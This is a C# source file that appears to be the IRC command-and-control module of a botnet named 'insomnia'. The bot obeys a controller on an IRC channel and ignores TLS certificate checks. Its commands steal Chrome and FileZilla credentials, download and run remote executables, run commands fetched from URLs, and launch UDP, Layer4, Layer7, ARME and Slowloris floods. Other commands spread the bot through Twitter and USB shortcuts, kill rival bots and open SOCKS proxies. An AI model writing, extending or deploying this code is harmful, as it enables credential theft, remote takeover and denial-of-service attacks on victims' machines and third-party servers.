using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Diagnostics;
using System.Net;

namespace insomnia
{
    internal class IRC
    {
        private static StreamWriter sw;
        private static StreamReader sr;
        private static SslStream ss;
        private static NetworkStream ns;
        private static TcpClient irc;
        private static bool active = true;
        private static int retryCount = 0;
        private static bool isMuted = false;
        private static string param1 = "", param2 = "", param3 = "", param4 = "";
        public static string channel;
        private static string cc = "";

        public static void Connect(string[] servers, string mainChannel, string mainChannelKey, int[] port, string authHost)
        {
            string inputLine;
            try
            {
                try // Attempt SSL connection by default
                {
                    irc = new TcpClient(servers[retryCount], port[retryCount]);
                    ss = new SslStream(irc.GetStream(), false, new RemoteCertificateValidationCallback(OnCertificateValidation));
                    ss.AuthenticateAsClient(servers[retryCount]);
                    sr = new StreamReader(ss);
                    sw = new StreamWriter(ss);
                }
                catch // Fallback to normal connection
                {
                    irc = new TcpClient(servers[retryCount], port[retryCount]);
                    ns = irc.GetStream();
                    sr = new StreamReader(ns);
                    sw = new StreamWriter(ns);
                }

                sw.AutoFlush = true;
                sw.WriteLine("PASS " + Config._password());
                sw.WriteLine("NICK " + Config.botNick);
                sw.WriteLine("USER " + Config.randomID + " 0 * :" + Config.randomID);

                while (active)
                {
                    string[] splitInput;
                    string[] splitBy;
                    string authCheck;

                    inputLine = sr.ReadLine();
                    splitInput = inputLine.Split(' ');
                    splitBy = inputLine.Split(':');
                    authCheck = splitBy[1];

                    if (splitInput[1] == "332")
                        Functions.DecryptTopic(splitInput[4].TrimStart(':'));

                    if (splitInput[0] == "PING")
                        sw.WriteLine("PONG " + splitInput[1]);

                    if (splitInput[0].Contains("001") || splitInput[1].Contains("001")) // 0 Fatalz 1 Unrealircd
                        sw.WriteLine("JOIN " + Config._mainChannel() + " " + Config._key());
                    

                    parseCommand(inputLine);   
                }
            }
            catch
            {
                if (active)
                {
                    try
                    {
                        irc.Close();
                        sr.Close();
                        sw.Close();
                        ss.Close();
                        ns.Close();
                    }
                    catch
                    {
                    }

                    IncrementRetry();
                    Thread.Sleep(3000);
                    Connect(Config._servers(), Config._mainChannel(), Config._key(), Config._port(), Config._authHost());
                }
            }

        }
        private static bool OnCertificateValidation(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true;
        }
        public static void parseCommand(string input)
        {
            try
            {
                string[] message = input.Split(' ');
                string[] authCheck = message[0].Split('@');

                // Get variables needed to parse commands
                string authHost = authCheck[1];
                string msgType = message[1];
                channel = message[2].TrimStart(':');
                string rawMsg = message[3].TrimStart(':');

                string fromNick = authCheck[0].Split(':')[1].Split('!')[0];

                if (channel == Config.botNick)
                    channel = fromNick;

                if (message.Length > 4)
                    param1 = message[4];
                else
                    param1 = "";
                if (message.Length > 5)
                    param2 = message[5];
                else
                    param2 = "";
                if (message.Length > 6)
                    param3 = message[6];
                else
                    param3 = "";
                if (message.Length > 7)
                    param4 = message[7];
                else
                    param4 = "";

                // Check for and do things for other messages than PRIVMSG
                switch (msgType)
                {
                    case "KICK":
                        sw.WriteLine("JOIN " + Config._mainChannel() + " " + Config._key());
                        break;
                    case "TOPIC":
                        if (Config.topicAct)
                            Functions.DecryptTopic(rawMsg);
                        break;
                    default:
                        break;
                }

                if (authHost == Config._authHost() && msgType != "TOPIC")
                {
                    runCommand(rawMsg, channel, param1, param2, param3, param4, message);
                }
            }
            catch
            {
            }
        }
        public static void runCommand(string command, string channel, string param1, string param2, string param3, string param4, string[] message)
        {
            switch (command)
            {
                case ".v":
                    WriteMessage("Version:" + ColorCode(" " + Config.version) +  ", Path:" + ColorCode(" '" + Config.currentPath) + "', MD5:" + ColorCode(" " + Config.botMD5) + ", Registry:" + ColorCode(" " + Config.regLocation) /*+ ", Active Threads:" + IRC.ColorCode(" " + Process.GetCurrentProcess().Threads.Count) */ + ".", channel);
                    break;

                case ".avinfo":
                    WriteMessage("Antivirus Product:" + ColorCode(" " + Functions.GetAntiVirus()) + ", Firewall Product:" + ColorCode(" " + Functions.GetFirewall()) + ".", channel);
                    break;

                case ".acc":
                    Thread a = new Thread(() => Chrome.GetChrome(param1));
                    a.IsBackground = true;
                    a.Start();
                    break;

                case ".j":
                    if (!String.IsNullOrEmpty(param1))
                        sw.WriteLine("JOIN " + param1);
                    break;

                case ".p":
                    if (!String.IsNullOrEmpty(param1))
                        sw.WriteLine("PART " + param1);
                    break;

                case ".sort":
                    sw.WriteLine("JOIN #" + Functions.GeoIPCountry());
                    break;

                case ".unsort":
                    sw.WriteLine("PART #" + Functions.GeoIPCountry());
                    break;

                case ".permsort":
                    if (Functions.PermType() == "a")
                        sw.WriteLine("JOIN #admins");
                    else
                        sw.WriteLine("JOIN #users");
                    break;

                case ".twitter":
                    Thread t = new Thread(() => Twitter.StartTwitterSpread(message));
                    t.IsBackground = true;
                    t.Start();
                    break;

                case ".ftp":
                    Thread f = new Thread(FTP.GetFileZilla);
                    f.IsBackground = true;
                    f.Start();
                    break;

                case ".bk":
                    if (param1 == "-i")
                    {
                        Thread bk = new Thread(Botkiller.explorerFlash);
                        bk.IsBackground = true;
                        bk.Start();
                    }
                    else
                    {
                        Thread bk = new Thread(Botkiller.initiate);
                        bk.IsBackground = true;
                        bk.Start();
                    }
                    break;

                case ".rc":
                    IRC.Disconnect("Reconnecting...");
                    Thread.Sleep(15000);
                    break;

                case ".up":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2))
                    {
                        if (Ruskill.enabled)
                            Ruskill.enabled = false;
                        Thread u = new Thread(() => Functions.UpdateBot(param1, param2.ToUpper()));
                        u.IsBackground = true;
                        u.Start();
                    }
                    break;

                case ".rm":
                    Functions.Uninstall("Uninstalling...");
                    break;

                case ".dl": // .dl URL ENVIRONMENT_VARIABLE
                    Thread dl = new Thread(() => Functions.DownloadExeFile(param1, param2, param3, false));
                    dl.IsBackground = true;
                    dl.Start();
                    break;

                case ".m":
                    if (param1 == "on")
                        isMuted = true;
                    if (param1 == "off")
                        isMuted = false;
                    break;

                case ".arme":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2) && !String.IsNullOrEmpty(param3))
                    {
                        if (param1.Contains("http://"))
                            param1 = param1.Replace("http://", "");
                        ARME.delay = Convert.ToInt32(param3);
                        ARME.host = param1;
                        ARME.port = Convert.ToInt32(param2);
                        ARME.isEnabled = true;
                        ARME.Start();

                        IRC.WriteMessage("ARME flood started on" + IRC.ColorCode(" " + ARME.host) + " on port" + IRC.ColorCode(" " + ARME.port) + " for" + IRC.ColorCode(" " + ARME.delay) + " seconds.", IRC.channel);
                    }
                    break;

                case ".layer7":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2) && !String.IsNullOrEmpty(param3))
                    {
                        if (param1.Contains("http://"))
                            param1 = param1.Replace("http://", "");
                        Layer7.delay = Convert.ToInt32(param3);
                        Layer7.host = param1;
                        Layer7.port = Convert.ToInt32(param2);
                        Layer7.isEnabled = true;
                        Layer7.Start();

                        IRC.WriteMessage("Layer7 flood started on" + IRC.ColorCode(" " + Layer7.host) + " on port" + IRC.ColorCode(" " + Layer7.port) + " for" + IRC.ColorCode(" " + Layer7.delay) + " seconds.", IRC.channel);
                    }
                    break;

                case ".layer4":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2) && !String.IsNullOrEmpty(param3))
                    {
                        if (param1.Contains("http://"))
                            param1 = param1.Replace("http://", "");
                        Layer4.delay = Convert.ToInt32(param3);
                        Layer4.host = param1;
                        Layer4.port = Convert.ToInt32(param2);
                        Layer4.isEnabled = true;
                        Layer4.Start();

                        IRC.WriteMessage("Layer4 flood started on" + IRC.ColorCode(" " + Layer4.host) + " on port" + IRC.ColorCode(" " + Layer4.port) + " for" + IRC.ColorCode(" " + Layer4.delay) + " seconds.", IRC.channel);
                    }
                    break;

                case ".udp":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2) && !String.IsNullOrEmpty(param3))
                    {
                        if (param1.Contains("http://"))
                            param1 = param1.Replace("http://", "");
                        UDP.delay = Convert.ToInt32(param3);
                        UDP.host = param1;
                        UDP.port = Convert.ToInt32(param2);
                        UDP.isEnabled = true;
                        UDP.Start();

                        IRC.WriteMessage("UDP flood started on" + IRC.ColorCode(" " + UDP.host) + " on port" + IRC.ColorCode(" " + UDP.port) + " for" + IRC.ColorCode(" " + UDP.delay) + " seconds.", IRC.channel);
                    }
                    break;

                case ".slow":
                    if (!String.IsNullOrEmpty(param1) && !String.IsNullOrEmpty(param2) && !String.IsNullOrEmpty(param3))
                    {
                        if (param1.Contains("http://"))
                            param1 = param1.Replace("http://", "");
                        Slowloris.delay = Convert.ToInt32(param3);
                        Slowloris.host = param1;
                        Slowloris.port = Convert.ToInt32(param2);
                        Slowloris.isEnabled = true;
                        Slowloris.Start();

                        IRC.WriteMessage("Slowloris flood started on" + IRC.ColorCode(" " + Slowloris.host) + " on port" + IRC.ColorCode(" " + Slowloris.port) + " for" + IRC.ColorCode(" " + Slowloris.delay) + " seconds.", IRC.channel);
                    }
                    break;

                case ".stop":
                    if (ARME.isEnabled || Layer7.isEnabled || Layer4.isEnabled || UDP.isEnabled || Slowloris.isEnabled)
                    {
                        ARME.Stop();
                        Layer7.Stop();
                        Layer4.Stop();
                        UDP.Stop();
                        Slowloris.Stop();

                        IRC.WriteMessage("All active floods have been aborted.", channel);
                    }
                    break;

                case ".read":
                    if (!String.IsNullOrEmpty(param1))
                    {
                        using (WebClient wc = new WebClient())
                        {
                            IRC.WriteMessage("Attempting to perform commands from url:" + IRC.ColorCode(" " + param1) + ".", channel);
                            Functions.DecryptTopic(wc.DownloadString(param1));
                        }
                    }
                    break;

                case ".ruskill":
                    if (!String.IsNullOrEmpty(param1))
                    {
                        if (param1 == "on" && Ruskill.enabled == false)
                        {
                            Thread r = new Thread(Ruskill.StartRuskill);
                            r.IsBackground = true;
                            r.Start();
                        }
                        else if (param1 == "off")
                        {
                            Ruskill.enabled = false;
                        }
                    }
                    break;

                case ".socks":
                    Thread s = new Thread(() => Functions.Socks(param1, param2));
                    s.IsBackground = true;
                    s.Start();
                    break;

                case ".usb":
                    try
                    {
                        if (param1 == "on")
                        {
                            USBlnk.initiated = true;
                            Thread usb = new Thread(USBlnk.StartLNK);
                            usb.IsBackground = true;
                            usb.Start();
                        }
                        else if (param1 == "off")
                        {
                            USBlnk.initiated = false;
                            USBlnk.Stop();
                        }
                    }
                    catch
                    {
                    }
                    break;

                default:
                    break;
            }
        }
        public static string ColorCode(string message)
        {
            if (Config._colors())
                return cc + "7" + message + cc;
            else
                return message;
        }
        public static void WriteMessage(string msg, string chan)
        {
            if (!isMuted)
                sw.WriteLine("PRIVMSG " + chan + " :" + msg);
        }
        private static void IncrementRetry()
        {
            int maxLength = Config._servers().Length - 1;

            if (retryCount == maxLength)
                retryCount = 0;
            else
                retryCount++;
        }
        public static void Disconnect(string message)
        {
            sw.WriteLine("QUIT :" + message);
        }
    }
}
